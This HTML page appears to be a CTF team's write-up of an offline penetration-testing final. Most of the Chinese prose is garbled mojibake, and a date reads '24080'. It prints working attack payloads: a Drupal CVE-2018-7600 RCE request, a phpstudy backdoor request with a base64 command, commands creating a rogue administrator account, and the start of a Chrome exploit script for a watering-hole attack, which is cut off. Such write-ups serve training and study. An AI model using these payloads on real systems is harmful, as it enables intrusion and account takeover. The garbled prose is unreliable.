<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>2023 å·…å³°æå®¢å†³èµ› SU WriteUp -</title><meta name=description content="æœ¬æ¬¡å·…å³°æå®¢å†³èµ›ä¸ºçº¿ä¸‹æ¸—é€èµ›ï¼Œæˆ‘ä»¬ SU å–å¾—äº† 2ndğŸ¥ˆçš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œåªè¦ä½ æ‹¥æœ‰ä¸€é¢—çƒ­çˆ± CTF çš„å¿ƒï¼Œéƒ½å¯ä»¥åŠ å…¥æˆ‘ä»¬ï¼æ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.com
ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ å·…å³°æå®¢ 2023 å†³èµ›çš„ writeupã€‚"><meta name=author content="SUer"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"su-team","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/su-team.cn\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/su-team.cn\/post\/dfjkfinal-2023-su-wu\/","name":"2023 å·…å³°æå®¢å†³èµ› su write up"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"SUer"},"headline":"2023 å·…å³°æå®¢å†³èµ›  SU WriteUp","description":"æœ¬æ¬¡å·…å³°æå®¢å†³èµ›ä¸ºçº¿ä¸‹æ¸—é€èµ›ï¼Œæˆ‘ä»¬ SU å–å¾—äº† 2ndğŸ¥ˆçš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œåªè¦ä½ æ‹¥æœ‰ä¸€é¢—çƒ­çˆ± CTF çš„å¿ƒï¼Œéƒ½å¯ä»¥åŠ å…¥æˆ‘ä»¬ï¼æ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.com\nä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ å·…å³°æå®¢ 2023 å†³èµ›çš„ writeupã€‚\n","inLanguage":"en","wordCount":649,"datePublished":"2023-08-24T14:02:00\u002b00:00","dateModified":"2023-08-24T14:02:00\u002b00:00","image":"https:\/\/su-team.cn\/img\/SU.jpg","keywords":["æ¸—é€"],"mainEntityOfPage":"https:\/\/su-team.cn\/post\/dfjkfinal-2023-su-wu\/","publisher":{"@type":"Organization","name":"https:\/\/su-team.cn\/","logo":{"@type":"ImageObject","url":"https:\/\/su-team.cn\/img\/SU.jpg","height":60,"width":60}}}</script><meta property="og:title" content="2023 å·…å³°æå®¢å†³èµ›  SU WriteUp"><meta property="og:description" content="æœ¬æ¬¡å·…å³°æå®¢å†³èµ›ä¸ºçº¿ä¸‹æ¸—é€èµ›ï¼Œæˆ‘ä»¬ SU å–å¾—äº† 2ndğŸ¥ˆçš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œåªè¦ä½ æ‹¥æœ‰ä¸€é¢—çƒ­çˆ± CTF çš„å¿ƒï¼Œéƒ½å¯ä»¥åŠ å…¥æˆ‘ä»¬ï¼æ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.com
ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ å·…å³°æå®¢ 2023 å†³èµ›çš„ writeupã€‚"><meta property="og:image" content="https://su-team.cn/img/SU.jpg"><meta property="og:url" content="https://su-team.cn/post/dfjkfinal-2023-su-wu/"><meta property="og:type" content="website"><meta property="og:site_name" content="su-team"><meta name=twitter:title content="2023 å·…å³°æå®¢å†³èµ›  SU WriteUp"><meta name=twitter:description content="æœ¬æ¬¡å·…å³°æå®¢å†³èµ›ä¸ºçº¿ä¸‹æ¸—é€èµ›ï¼Œæˆ‘ä»¬ SU å–å¾—äº† 2ndğŸ¥ˆçš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œåªè¦ä½ æ‹¥æœ‰ä¸€é¢—çƒ­çˆ± CTF çš„å¿ƒï¼Œéƒ½å¯ä»¥åŠ å…¥æˆ‘ä»¬ï¼æ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.com
ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ å·…å³°æå®¢ 2023 å†³èµ›çš„ writeupã€‚"><meta name=twitter:image content="https://su-team.cn/img/SU.jpg"><meta name=twitter:card content="summary_large_image"><link href=https://su-team.cn/img/SU.jpg rel=icon type=image/x-icon><meta name=generator content="Hugo 0.148.2"><link rel=alternate href=https://su-team.cn/index.xml type=application/rss+xml title=su-team><link rel=stylesheet href=https://su-team.cn/css/katex.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/brands.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/fontawesome.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/regular.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/solid.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg-with-js.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-font-face.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-shims.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v5-font-face.min.css><link rel=stylesheet href=https://su-team.cn/css/bootstrap.min.css><link rel=stylesheet href=https://su-team.cn/css/main.css><link rel=stylesheet href=https://su-team.cn/css/fonts.css><link rel=stylesheet href=https://su-team.cn/css/syntax.css><link rel=stylesheet href=https://su-team.cn/css/codeblock.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.min.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.default-skin.min.css><style>.navbar-custom .avatar-container{width:58px;height:58px;margin-top:-29px;left:50%;transform:translateX(-50%);display:flex;align-items:center;justify-content:center;background:#fff;border-radius:50%;box-shadow:0 6px 18px rgba(0,0,0,.12)}.navbar-custom .avatar-container .avatar-img-border{width:100%;height:100%;border-radius:50%;overflow:hidden;margin:0;box-shadow:none}.navbar-custom .avatar-container .avatar-img{width:100%;height:100%;object-fit:cover;border-radius:50%}@media only screen and (min-width:768px){.navbar-custom .avatar-container{width:72px;height:72px;margin-top:-36px}}</style></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
<span class=sr-only>Toggle navigation</span>
<span class=icon-bar></span>
<span class=icon-bar></span>
<span class=icon-bar></span>
</button>
<a class="theme-toggle mobile-theme-toggle" href=javascript:void(0) onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</a><a class=navbar-brand href=https://su-team.cn/>su-team</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title=Archives href=/>Archives</a></li><li class=navlinks-container><a class=navlinks-parent role=button tabindex=0>Members</a><div class=navlinks-children><a href=/active-members>Members</a>
<a href=/pioneers>Pioneers</a></div></li><li><a title=About href=/page/about/>About</a></li><li><a title=Tags href=/tags>Tags</a></li><li class=hidden-xs><a href=javascript:void(0) class=theme-toggle onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></a></li></ul></div></div></nav><script>(function(){const e=localStorage.getItem("theme"),t=window.matchMedia("(prefers-color-scheme: dark)").matches;e==="dark"||!e&&t?document.body.classList.add("dark-mode"):document.body.classList.remove("dark-mode")})();function toggleTheme(){const e=document.body;e.classList.toggle("dark-mode"),e.classList.contains("dark-mode")?localStorage.setItem("theme","dark"):localStorage.setItem("theme","light")}</script><style>.theme-toggle{cursor:pointer;padding:15px;display:flex;align-items:center}.mobile-theme-toggle{float:right;padding:15px 10px;margin-top:2px}@media(min-width:768px){.mobile-theme-toggle{display:none !important}}.theme-icon-moon,.theme-icon-sun{color:#777;transition:color .3s,transform .3s}.theme-toggle:hover .theme-icon-moon,.theme-toggle:hover .theme-icon-sun{color:#333}.theme-icon-sun{display:none}.theme-icon-moon{display:block}body.dark-mode .theme-icon-sun{display:block;color:#000}body.dark-mode .theme-icon-moon{display:none}body.dark-mode{filter:none !important;background-color:#1a1a1a !important}body.dark-mode header,body.dark-mode .container,body.dark-mode footer{filter:invert(1)hue-rotate(180deg)}body.dark-mode .navbar-custom{background-color:#1a1a1a !important;border-bottom:1px solid #333}body.dark-mode .navbar-custom .container-fluid{filter:invert(1)hue-rotate(180deg)}body.dark-mode img,body.dark-mode video,body.dark-mode iframe,body.dark-mode .avatar-img,body.dark-mode .navbar-custom .avatar-container{filter:invert(1)hue-rotate(180deg)}</style><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><h1>2023 å·…å³°æå®¢å†³èµ› SU WriteUp</h1><span class=post-meta><i class="fas fa-calendar"></i>&nbsp;Posted on August 24, 24080
&nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;4&nbsp;min
&nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;649&nbsp;words
&nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;SUer</span></div></div></div></div></div></header><div class=container role=main><div class="row flex-row"><div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs"><div class=toc-sidebar><h4 class=toc-title>#<br>TABLE OF CONTENTS</h4><div class=toc-card><nav id=TableOfContents><ul><li><ul><li><a href=#èµ›åˆ¶æè¿°>èµ›åˆ¶æè¿°</a><ul><li><a href=#ç½‘ç»œæ‹“æ‰‘>ç½‘ç»œæ‹“æ‰‘</a></li><li><a href=#1æ‹›è˜ç½‘ç«™17320194>1ã€æ‹›è˜ç½‘ç«™173.20.1.94</a></li><li><a href=#2é—¨æˆ·ç½‘ç«™-17320153>2ã€é—¨æˆ·ç½‘ç«™ 173.20.1.53</a></li><li><a href=#3åŠå…¬ç”µè„‘-151007010>3ã€åŠå…¬ç”µè„‘ 15.100.70.10</a></li><li><a href=#4æ™ºæ…§æ°´åˆ©æœåŠ¡-1510070100>4ã€æ™ºæ…§æ°´åˆ©æœåŠ¡ 15.100.70.100</a></li><li><a href=#5å·¥ç¨‹å¸ˆç«™1921682100>5ã€å·¥ç¨‹å¸ˆç«™192.168.2.100</a></li><li><a href=#6æ“ä½œå‘˜ç«™1921682210>6ã€æ“ä½œå‘˜ç«™192.168.2.210</a></li><li><a href=#7å·¥æ§-1921682200>7ã€å·¥æ§ 192.168.2.200</a></li></ul></li></ul></li></ul></nav></div></div></div><div class="col-lg-9 col-md-9"><article role=main class=blog-post><p>æœ¬æ¬¡å·…å³°æå®¢å†³èµ›ä¸ºçº¿ä¸‹æ¸—é€èµ›ï¼Œæˆ‘ä»¬ SU å–å¾—äº† 2ndğŸ¥ˆçš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œåªè¦ä½ æ‹¥æœ‰ä¸€é¢—çƒ­çˆ± CTF çš„å¿ƒï¼Œéƒ½å¯ä»¥åŠ å…¥æˆ‘ä»¬ï¼æ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼š<a href=mailto:suers_xctf@126.com>suers_xctf@126.com</a></p><p>ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ å·…å³°æå®¢ 2023 å†³èµ›çš„ writeupã€‚</p><h2 id=èµ›åˆ¶æè¿°>èµ›åˆ¶æè¿°</h2><p>æœ¬æ¬¡æ¯”èµ›ä¸€å…±8å°æ—¶ï¼Œä¸Šåˆ10ç‚¹åˆ°ä¸‹åˆ6ç‚¹ï¼Œå¤šå±‚ç½‘ç»œæ¸—é€èµ›ï¼Œå…¶ä¸­åŒ…å«äº†ä¸€äº›å·¥æ§çš„ç‚¹ï¼Œå·¥æ§å’Œæ¸—é€æ¯”é‡äº”äº”å¼€ï¼Œä¸è¿‡å¤§å¤šéƒ½æ˜¯æ‰“æ¸—é€æ‹¿åˆ†ã€‚æ¯”èµ›ä¸­ä¸å…è®¸é€‰æ‰‹è”ç½‘ï¼Œä½†æ˜¯æœ‰è”ç½‘åŒº4æ ¹ç½‘çº¿å¯ä»¥ä¸Šç½‘ä¸‹èµ„æ–™ï¼Œç”±äºèµ›ä¸­ä¸éœ€è¦äº¤wpï¼Œæœ¬wpæ˜¯æ„Ÿè§‰å›å¿†æè¿°è€Œæ¥ï¼Œå¦‚æœ‰åå·®ï¼Œå¤šå¤šåŒ…æ¶µã€‚</p><h3 id=ç½‘ç»œæ‹“æ‰‘>ç½‘ç»œæ‹“æ‰‘</h3><p>æœ¬æ¬¡æ¯”èµ›æ²¡æœ‰æä¾›ç½‘ç»œæ‹“æ‰‘ï¼Œéœ€è¦è‡ªå·±æ”»å‡»ä¸€æ­¥æ­¥æ¨ç†ï¼Œä½†æ˜¯æ¯”èµ›çš„ä¸­é€”ç»™äº†ä¸€ä¸ªé¢˜ç›®â€œæ¯”èµ›ä¸­å¯ä»¥æ ¹æ®å¤§å±å¹•ä¸Šçš„æ‹“æ‰‘å›¾æ¨æµ‹é€»è¾‘â€ï¼Œä½†æ˜¯å±å¹•åˆè¿œåˆèŠ±ï¼Œè€Œä¸”å›¾å¾ˆæŠ½è±¡ã€‚
<img src=/img/2023-08-24-DFJKfinal/1.jpg alt></p><p>æ‰€ä»¥æ ¹æ®å®é™…æƒ…å†µæˆ‘ä»¬ç”»äº†ä¸€å¼ è‡ªå·±æ„Ÿè§‰ä¸Šçš„å›¾(äº‹åæ ¹æ®å›å¿†ç”»çš„ï¼Œæœ‰äº›å·®å¼‚)
<img src=/img/2023-08-24-DFJKfinal/2.png alt></p><h3 id=1æ‹›è˜ç½‘ç«™17320194>1ã€æ‹›è˜ç½‘ç«™173.20.1.94</h3><p>å› ä¸ºå¼€åœºé¢˜ç›®åªç»™äº†è¿™ä¸ªipï¼Œæ‰€ä»¥å¤§å®¶éƒ½åœ¨æ‰“è¿™ä¸ªï¼Œè¿™ä¸ªæ‹›è˜ç½‘ç«™æ˜¯ç›´æ¥æ‰“çš„drupalè¿œç¨‹ä»£ç æ‰§è¡Œ (CVE-2018-7600),åœ¨vulhubä¸Šæœ‰ç›´æ¥çš„exp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1
</span></span><span class=line><span class=cl>Host: your-ip:8080
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept: */*
</span></span><span class=line><span class=cl>Accept-Language: en
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>Content-Length: 103
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=id
</span></span></code></pre></td></tr></table></div></div><p>æ‹¿ä¸‹åï¼Œæœ¬æ¥æƒ³å°è¯•æ‹¿è¿™å°æœåŠ¡å™¨æ­å»ºä»£ç†ï¼Œæˆ–è€…ææƒç­‰ï¼Œå¤§æ¦‚è¿‡äº†1å°æ—¶ï¼Œå‘äº†å…¬å‘Š1ã€æ‹›è˜ç½‘ç«™åªæ˜¯ä¸€ä¸ªç­¾åˆ°ï¼Œä¸éœ€è¦æ·±å…¥åˆ©ç”¨ï¼Œç„¶åå¼€å§‹æ‰«æ173.20.1.x/24</p><h3 id=2é—¨æˆ·ç½‘ç«™-17320153>2ã€é—¨æˆ·ç½‘ç«™ 173.20.1.53</h3><p>è¿™å°±å¾ˆå¥‡æ€ªäº†ï¼Œä¸»åŠæ–¹æ²¡ç»™å…¬å‘Šä¹‹å‰æ‰«äº†å¾ˆå¤šæ¬¡æ²¡ä¸œè¥¿ï¼Œå‘äº†å…¬å‘Šåç›´æ¥æ‰«æåˆ°äº†è¿™ä¸ªç½‘ç«™ï¼Œè€Œä¸”ç»™äº†phpinfoï¼Œphpinfoæä¾›äº†phpç‰ˆæœ¬æ˜¯ 5.4.45,å­˜åœ¨phpstudyçš„åé—¨æ¼æ´ï¼Œpocç›´æ¥æ‰“ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET / HTTP/1.1
</span></span><span class=line><span class=cl>Host: 127.0.0.1
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</span></span><span class=line><span class=cl>Accept-Encoding:gzip,deflate
</span></span><span class=line><span class=cl>Accept-Charset:c3lzdGVtKCJuZXQgdXNlciIpOw==
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>Cache-Control: max-age=0
</span></span><span class=line><span class=cl>Content-Length: 2
</span></span></code></pre></td></tr></table></div></div><p>è¿™ä¸ªæ˜¯windowså†™é©¬æŒºæ€ªçš„ï¼ŒèŠ±äº†ä¸€äº›æ—¶é—´ä¸Šå»ï¼Œå‘ç°æ˜¯é«˜æƒé™ç”¨æˆ·ï¼Œå‘½ä»¤æ‰§è¡Œå¢åŠ ç”¨æˆ·</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>net user dddd123 dddqwe@!@# /add
</span></span><span class=line><span class=cl>net localgroup administrators dddd123 /add 
</span></span></code></pre></td></tr></table></div></div><p>ç„¶åä½¿ç”¨çŒ•çŒ´æ¡ƒå¯ä»¥æŠ“adminåˆ°å¯†ç ï¼ŒåŒæ—¶å­˜åœ¨wiresharkè½¯ä»¶</p><h3 id=3åŠå…¬ç”µè„‘-151007010>3ã€åŠå…¬ç”µè„‘ 15.100.70.10</h3><p>ä¸»åŠæ–¹å¤šæ¬¡æš—ç¤ºï¼Œè¿™ä¸ªåŠå…¬ç”µè„‘ä¼šä½¿ç”¨æµè§ˆå™¨ä¹Ÿè®¿é—®é—¨æˆ·ã€‚è¿™é¢˜åº”è¯¥æ˜¯æœ€æ¶å¿ƒçš„ä¸€ä¸ªç‚¹ã€‚
å› ä¸ºæ‹¿ä¸‹æ¥é—¨æˆ·ï¼Œå¯ä»¥ç›´æ¥æŒ‚é»‘é¡µæ°´å‘æ”»å‡»ï¼Œæˆ‘ä»¬åœ¨173.20.1.53ä¸ŠæŒ‚ä¸€ä¸ªæ¶æ„jsï¼Œè®©åŠå…¬ç”µè„‘è®¿é—®åˆ°rceã€‚
é¦–å…ˆæˆ‘ä»¬ä½¿ç”¨é—¨æˆ·ç½‘ç«™ä¸Šçš„wiresharkè½¯ä»¶æŠ“åˆ°åŠå…¬ç”µè„‘è®¿é—®çš„æµé‡ï¼Œå…¶ä¸­çœ‹åˆ°äº†å¤´éƒ¨å¸¦æœ‰çš„uaï¼Œæ˜¾ç¤ºæ˜¯89.0.4389.114ã€‚
åˆšå¥½æ˜¯2021å¹´çˆ†å‡ºæ¥çš„chrome 0day rceç‰ˆæœ¬ã€‚</p><p>ä¸­é€”å¤§æ¦‚å°±ä¸¤ä¸‰ä¸ªé˜Ÿæ‰“äº†ï¼Œä¸»åŠæ–¹è€ƒè™‘åˆ°å¤§å®¶æ²¡å•¥ç¯å¢ƒï¼Œå°±ç»™äº†cs4.2ç‰ˆæœ¬ã€‚æœ€è‰¯å¿ƒçš„æ˜¯æŠŠexpä¹Ÿç»™äº†ï¼Œå†åˆ°æœ€åç›´æ¥ç»™äº†wordè¯´æ˜æ–‡æ¡£</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>&lt;</span><span class=n>script</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>   <span class=n>function</span> <span class=n>gc</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>       <span class=k>for</span> <span class=p>(</span><span class=k>var</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mh>0x80000</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>           <span class=k>var</span> <span class=n>a</span> <span class=o>=</span> <span class=n>new</span> <span class=n>ArrayBuffer</span><span class=p>();</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>   <span class=n>let</span> <span class=n>shellcode</span> <span class=o>=</span> <span class=p>[</span><span class=err>ä¸å‘Šè¯‰ä½ </span><span class=p>];</span>
</span></span><span class=line><span class=cl>   <span class=k>var</span> <span class=n>wasmCode</span> <span class=o>=</span> <span class=n>new</span> <span class=n>Uint8Array</span><span class=p>([</span><span class=mi>0</span><span class=p>,</span> <span class=mi>97</span><span class=p>,</span> <span class=mi>115</span><span class=p>,</span> <span class=mi>109</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>133</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>96</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>127</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>130</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>132</span><span class=p>,</span> <span 